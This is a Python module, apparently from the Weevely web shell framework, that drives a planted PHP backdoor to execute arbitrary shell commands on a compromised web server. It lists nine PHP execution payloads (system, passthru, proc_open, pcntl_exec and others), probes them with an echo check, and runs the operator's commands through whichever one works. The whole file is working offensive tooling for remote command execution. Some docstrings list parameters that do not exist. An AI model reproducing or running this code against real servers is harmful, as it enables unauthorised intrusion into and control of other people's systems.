from core.vectors import PhpCode
from core.module import Module, Status
from core.loggers import log
from core.vectors import Os
from core import messages
from core import modules
import secrets

class Sh(Module):

    """Execute shell commands."""

    def init(self):
        """"Initializes the function by registering author information and license, as well as system-like calls and arguments. The function allows for executing shell commands and redirects stderr output. The function also registers different types of vectors and arguments, including the command, stderr redirection, and vector choices."
        Parameters:
            - self (type): The function object.
            - param1 (type): The author information, as a list.
            - param2 (type): The license information, as a string.
        Returns:
            - type: None.
        Processing Logic:
            - Registers author and license information.
            - Registers system-like calls.
            - Registers arguments, including command, stderr redirection, and vector choices."""
        

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
            # All the system-like calls has to be properly wrapped between single quotes
            PhpCode("""@system('${command}${stderr_redirection}');""", "system"),
            PhpCode("""@passthru('${command}${stderr_redirection}');""", "passthru"),
            PhpCode("""print(@shell_exec('${command}${stderr_redirection}'));""", "shell_exec"),
            PhpCode("""$r=array(); @exec('${command}${stderr_redirection}', $r);print(join(\"\\n\",$r));""", "exec"),
            PhpCode("""
                $h=@popen('${command}','r');
                if($h){
                    while(!feof($h)) echo(fread($h,4096));
                    pclose($h);
                }""", "popen"),
            PhpCode("""
                $p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));
                $h = @proc_open('${command}', $p, $pipes);
                if($h&&$pipes){
                    while(!feof($pipes[1])) echo(fread($pipes[1],4096));
                    while(!feof($pipes[2])) echo(fread($pipes[2],4096));
                    fclose($pipes[0]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($h);
                }""", "proc_open"),
            PhpCode("""@python_eval('import os; os.system('${command}${stderr_redirection}');');""", "python_eval"),
            PhpCode("""
                if(class_exists('Perl')){
                    $perl=new Perl();
                    $r=$perl->system('${command}${stderr_redirection}');
                    print($r);
                }""", "perl_system"),
            # pcntl_fork is unlikely, cause is callable just as CGI or from CLI.
            PhpCode("""
                if(is_callable('pcntl_fork')) {
                    $p=@pcntl_fork();
                    if(!$p){
                        @pcntl_exec("/bin/sh",Array("-c",'${command}'));
                    } else {
                        @pcntl_waitpid($p,$status);
                    }
                }""",
                name="pcntl", target=Os.NIX),
            ])

        self.register_arguments([
          { 'name' : 'command', 'help' : 'Shell command', 'nargs' : '+' },
          { 'name' : '-stderr_redirection', 'default' : ' 2>&1' },
          { 'name' : '-vector', 'choices' : self.vectors.get_names() },
        ])

    def setup(self):
        """Probe all vectors to find a working system-like function.

        The method run_until is not used due to the check of shell_sh
        enabling for every tested vector.

        Args:
            self.args: The dictionary of arguments

        Returns:
            Status value, must be Status.RUN, Status.FAIL, or Status.IDLE.

        """

        check_digits = str(secrets.SystemRandom().randint(11111, 99999))

        args_check = {
                    'command': 'echo %s' % check_digits,
                    'stderr_redirection': ''
        }

        (vector_name,
         result) = self.vectors.find_first_result(
          names = [ self.args.get('vector', '') ],
            format_args = args_check,
            condition = lambda result: (
                # Stop if shell_php is not running
                self.session['shell_php']['status'] != Status.RUN or
                # Or if the result is correct
                result and result.rstrip() == check_digits
                )
            )

        if self.session['shell_php']['status'] == Status.RUN and result and result.rstrip() == check_digits:
            self.session['shell_sh']['stored_args']['vector'] = vector_name
            return Status.RUN
        else:
            return Status.FAIL

    def run(self):
        """This function runs a command and returns the result as a vector.
        Parameters:
            - self (object): The object calling the function.
            - command (list): A list of strings representing the command to be run.
        Returns:
            - vector (object): The result of the command as a vector.
        Processing Logic:
            - Join the command list into a single string.
            - Escape any single quotes in the command.
            - Get the result from the vectors object using the specified vector name and format arguments."""
        

        # Join the command list and

        # Escape the single quotes. This does not protect from \' but
        # avoid to break the query for an unscaped quote.

        self.args['command'] = ' '.join(self.args['command']).replace("'", "\\'")

        return self.vectors.get_result(
         name = self.args['vector'],
         format_args = self.args
        )
